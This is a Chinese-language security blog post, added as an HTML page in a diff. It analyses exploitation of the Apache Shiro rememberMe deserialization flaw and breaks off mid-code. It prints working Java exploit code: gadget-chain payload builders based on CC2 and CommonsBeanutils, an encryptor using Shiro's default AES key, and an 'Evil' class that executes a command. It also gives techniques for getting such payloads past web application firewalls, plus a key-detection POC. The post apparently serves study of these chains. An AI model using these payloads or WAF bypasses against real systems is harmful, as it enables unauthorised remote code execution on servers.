@@ -1,0 +1,1407 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JAVA反序列篇-浅谈Shiro利用分析, 学的越深越发现自己的渺小">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>JAVA反序列篇-浅谈Shiro利用分析 | 学的越深越发现自己的渺小</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">学的越深越发现自己的渺小</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">学的越深越发现自己的渺小</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">JAVA反序列篇-浅谈Shiro利用分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-04-07
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面几篇文章中从最容易入手的<code>URLDNS</code>链条，再到CC6，CC1，CC2基本可以说把所有CC链都学完了，其他的CC链的出现也是为了解决黑名单的问题。</p>
+<p>借用P牛的一段话，我们既然已经有<code>CommonsCollections6</code>这样通杀的利用链了，为什么还需要一 个<code>TemplatesImpl</code>的链呢？因为通过 TemplatesImpl 构造的利用链，理论上可以执行任意Java代码，这是一种非常通用的代码执行漏 洞，不受到对于链的限制，特别是这几年内存马逐渐流行以后，执行任意Java代码的需求就更加浓烈了。</p>
+<p><strong>几个问题</strong></p>
+<ul>
+<li>为什么<code>CommonsCollections6</code>等部分CC链条无法在<code>Shiro</code>中反序列化利用成功呢？</li>
+<li>Shiro环境没有<code>CommonsCollections</code>依赖该怎么利用？</li>
+<li>为什么P牛的Shiro环境用有些工具打<code>CommonsBeanutils1</code>链条会反序列化失败？</li>
+<li><code>Shiro</code>遇到WAF的时候又该怎么绕过？</li>
+<li><code>Shiro</code>环境不出网时，我们该怎么判断是否存在Shiro反序列化漏洞？</li>
+</ul>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>Shiro1.2.4</li>
+<li>CommonsCollections依赖</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>Shiro</code>为了让浏览器或服务器重启后用户不丢失登录状态，支持将持久化信息序列化并加密后保存在<code>Cookie</code>的<code>rememberMe</code>字段中，下次读取时进行解密再反序列化。但是在<code>Shiro&lt;=1.2.4</code>版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的<code>rememberMe Cookie</code>，进而触发反序列化漏洞。</p>
+<p><strong>攻击流程</strong></p>
+<ul>
+<li>利用我们学过的CC链条生成一条序列化payload</li>
+<li>利用Shiro默认的Key进行加密</li>
+<li>进行Base64编码</li>
+<li>将编码过的字符串当做rememberMe字段的值发送给服务端</li>
+</ul>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/0.png"></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/1.png"></p>
+<h3 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a><strong>第一个问题</strong></h3><p>为什么<code>CommonsCollections6</code>等部分CC链条无法在<code>Shiro</code>中反序列化利用成功呢？</p>
+<p>把payload发送过去，没有像预期那样弹出计算器，Tomcat服务端也出现了报错，我们来一起探究下。</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/2.png"></p>
+<p><code>org.apache.shiro.io.ClassResolvingObjectInputStream</code>类是一个<code>ObjectInputStream</code>的子类，其重写了<code>resolveClass</code>方法，</p>
+<p><code>resolveClass</code>是反序列化中用来查找类的方法，读取序列化流的时候，读到一个字符串形式的类名，通过这个方法来找到对应的     <code>java.lang.Class</code>对象。对比一下它的父类，也就是正常的<code>ObjectInputStream</code>类中的 <code>resolveClass</code>方法。</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/3.png"></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/4.png"></p>
+<p>前者用的是 <code>org.apache.shiro.util.ClassUtils#forName </code>（实际上内部用到了 <code>org.apache.catalina.loader.ParallelWebappClassLoader#loadClass</code> ），而后者用的是Java原 生的 <code>Class.forName</code>。下断点调试，看看哪个类触发了异常。</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/5.png"></p>
+<p>出现异常的类是<code>Lorg.apache.commons.collections.Transformer</code>类，学过CC链就会知道表示的是<code>org.apache.commons.collections.Transformer</code>的数组。</p>
+<p>借用P牛的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么<code>CommonsCollections6</code>及部分CC链条无法利用了，因为其中用到了<code>Transformer</code>数组。</p>
+<p><strong>构造不含Transformer数组的Gadget</strong></p>
+<p><strong>Gadget</strong></p>
+<pre><code>Gadget chain:
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                TransformingComparator.compare()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            TemplatesImpl.newTransformer()
+                                TemplatesImpl.getTransletInstance()
+                                    TemplatesImpl.defineTransletClasses()
+                                        TransletClassLoader.defineClass()
+                                            newInstance()
+                                                Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/6.png"></p>
+<p><strong>POC</strong></p>
+<pre><code>package payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.shiro.codec.Base64;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CC2_shiro_cc4 &#123;
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;
+
+        byte[][] codes=&#123;clazzBytes&#125;;
+
+        TemplatesImpl templatesImpl= new TemplatesImpl();
+
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        field.setAccessible(true);
+        field.set(templatesImpl,codes);
+
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&quot;test&quot;);
+
+        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[0],new Object[0]);
+        TransformingComparator comparator =new TransformingComparator(transformer);
+
+        PriorityQueue queue = new PriorityQueue(2);
+        queue.add(1);
+        queue.add(1);
+
+        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,comparator);
+
+        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        field3.setAccessible(true);
+        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    &#125;
+&#125;</code></pre>
+<p><strong>Exp</strong></p>
+<pre><code>package Exp;
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.shiro.codec.Base64;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+import payload.CC2_shiro_cc4;
+
+public class CC2Exp &#123;
+    public static void main(String []args) throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+        byte[] payloads = new CC2_shiro_cc4().getPayload(clazz.toBytecode());
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+&#125;</code></pre>
+<p><strong>Evil恶意类</strong></p>
+<pre><code>package Exp;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Evil  extends AbstractTranslet &#123;
+    static &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (Exception e) &#123;&#125;
+    &#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+    &#125;
+&#125;</code></pre>
+<p>这里不做过多的分析，不了解的可以看看前几篇文章的分析。</p>
+<h3 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h3><p>Shiro环境没有<code>CommonsCollections</code>依赖该怎么利用？</p>
+<p>Shiro自带了Apache Commons Beanutils这个库，我们可以利用这个库来触发反序列化命令执行漏洞。</p>
+<p><strong>知识补充</strong></p>
+<p><code>Commons Beanutils</code>是应用于<code>JavaBean</code>的工具</p>
+<p><code>JavaBean</code>简单理解：1.公有类 2.无参构造函数 3.成员变量私有 4.getter和setter方法包装成员变量</p>
+<p>就是属性都有访问器和更改器。而<code>Commons Beanutils</code>中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意<code>JavaBean</code>的<code>getter</code>方法。</p>
+<p>比如一个类<code>User</code>是个<code>JavaBean</code>，它有个<code>name</code>属性，则<code>PropertyUtils.getProperty(new Usesr(),&quot;name&quot;)</code>则会调用它的<code>getName()</code>方法。</p>
+<p>这有什么用呢？我们前面分析过<code>TemplateImpl</code>类中还有一个方法一样可以触发最后的字节码加载并实例化。那就是<code>getOutputProperties</code>方法，如果我们可以调用<code>PropertyUtils.getProperty(new TemplateImpl(),&quot;OutputProperties&quot;)</code>是不是就可以RCE了。</p>
+<p>经过大佬们的探索，发现<code>Commons Beanutils</code>中的<code>BeanComparator</code>类的<code>compare()</code>方法调用了<code>PropertyUtils.getProperty</code></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8.png"></p>
+<p>拼接<code>CommonsCollection2</code>的前半段形成新的利用链条</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/9.png"></p>
+<p><strong>Gadget</strong></p>
+<pre><code>Gadget chain:
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                BeanComparator.compare()
+                    TemplatesImpl.getOutputProperties()
+                        TemplatesImpl.newTransformer()
+                            TemplatesImpl.getTransletInstance()
+                                TemplatesImpl.defineTransletClasses()
+                                    TransletClassLoader.defineClass()
+                                           newInstance()
+                                            Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/7.png"></p>
+<p><strong>POC</strong></p>
+<pre><code>package payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CB1_shiroAll &#123;
+
+    public static byte[] getPayload(byte[] clazzBytes) throws IOException, NoSuchFieldException, IllegalAccessException &#123;
+
+        byte[][] codes=&#123;clazzBytes&#125;;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        Class tc=templates.getClass();
+
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+
+        Field pro = comparator.getClass().getDeclaredField(&quot;property&quot;);
+        pro.setAccessible(true);
+        pro.set(comparator, &quot;outputProperties&quot;);
+
+        Field que = queue.getClass().getDeclaredField(&quot;queue&quot;);
+        que.setAccessible(true);
+        que.set(queue,new Object[]&#123;templates,templates&#125;);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+
+    &#125;
+&#125;</code></pre>
+<h3 id="第三个问题"><a href="#第三个问题" class="headerlink" title="第三个问题"></a>第三个问题</h3><p>为什么P牛的Shiro环境用有些工具打<code>CommonsBeanutils1</code>链条会反序列化失败？</p>
+<p><strong>知识补充</strong></p>
+<p>serialVersionUID是什么？ </p>
+<p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。 当然，开发者也可以手工给类赋予一个 serialVersionUID 值，此时就能手工控制兼容性了。 所以，利用失败的原因就是本地使用的<code>commons-beanutils</code>是1.9.2版本，而Shiro中自带的<code>commons-beanutils</code>是1.8.3版本，出现了 <code>serialVersionUID</code> 对应不上的问题。 </p>
+<p>将本地的<code>commons-beanutils</code>也换成1.8.3版本就可成功利用。所以不要盲目的相信他人的工具，一定要看看工具的源码是咋写的。</p>
+<h3 id="第四个问题"><a href="#第四个问题" class="headerlink" title="第四个问题"></a>第四个问题</h3><p><code>Shiro</code>遇到WAF的时候又该怎么绕过？</p>
+<p>现在的站点大部分都有部署WAF对网站进行防护，而且防护都比较严格。对rememberMe长度的限制，对解密后的反序列类检查。</p>
+<p><strong>0x01</strong></p>
+<p>使用垃圾数据绕过</p>
+<p>rememberMe = payload + == + 垃圾数据</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/10.png"></p>
+<p><strong>0x02</strong></p>
+<p>使用未知HTTP请求绕过，有的WAF不会对未知HTTP请求进行拦截。但我们也需要保证后端会正常解析rememberMe字段，经试验此方法可行。</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/11.png"></p>
+<p><strong>0x03</strong></p>
+<p>通过base64解码特性导致waf不能成功解码绕过waf</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一） (qq.com)</a></p>
+<p>base64解码时，不同语言的接口实现有略微区别</p>
+<ul>
+<li>字符串中包含 <code>. %</code> 等符号时，是选择忽略这些符号，还是报错</li>
+<li>字符串中包含 <code>=</code> 符号，解析到<code>=</code>时，是认为解析完成了，还是忽略”等号”继续解析</li>
+</ul>
+<p><img src="E:\boke\blog\source_posts\JAVA反序列篇-浅谈Shiro利用分析\12.png"></p>
+<p>所以我们可以通过在payload中添加<code>...........</code>或者<code>%%%%</code>来绕过waf，让waf解析失败</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/13.png"></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/14.png"></p>
+<h3 id="第五个问题"><a href="#第五个问题" class="headerlink" title="第五个问题"></a>第五个问题</h3><p><code>Shiro</code>环境不出网时，我们该怎么判断是否存在Shiro反序列化漏洞?</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">一种另类的shiro检测方式</a></p>
+<p>简单说下原理，就是反序列过程最后会进行类型转换，而返回包中DeleteMe字段是在密钥不对或者类型转换等错误抛出异常时，在返回头添加的字段。如果我们反序列化的类是<code>PrincipalCollection</code>的子类且密钥又正确，返回头便不会有DeleteMe字段。</p>
+<pre><code>protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123;
+    return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);
+&#125;</code></pre>
+<p>这个类就是<code>SimplePrincipalCollection</code></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/15.png"></p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/16.png"></p>
+<p><strong>检测POC</strong></p>
+<pre><code>package payload;
+
+import org.apache.shiro.subject.SimplePrincipalCollection;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+
+public class KeyTest &#123;
+
+    public byte[] getPayload() throws IOException &#123;
+        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
+
